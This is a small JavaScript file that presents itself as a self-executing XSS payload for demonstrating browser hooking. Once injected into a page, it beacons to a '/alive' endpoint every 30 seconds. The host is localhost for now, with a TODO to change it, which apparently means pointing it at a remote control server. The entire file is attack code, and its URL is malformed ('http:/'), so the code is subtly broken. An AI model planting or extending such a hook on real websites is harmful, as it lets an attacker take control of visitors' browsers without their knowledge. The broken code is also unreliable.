/*
Simple AJAX self-executing xss payload used to demonstrate hooking browsers
 */

(function() {
    function sendRequest() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http:/127.0.0.1:5000/alive', true); // TODO : Change from local host

        xhr.setRequestHeader('Content-Type', 'application/json');

        var data = JSON.stringify({
            message: "Hello, server!"
        });

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Response from server:', xhr.responseText);

                var responseData = JSON.parse(xhr.responseText);
            }
        };

        xhr.onerror = function() {
            console.error('Request failed');
        };

        xhr.send(data);
    }

    sendRequest();

    setInterval(sendRequest, 30000);
})();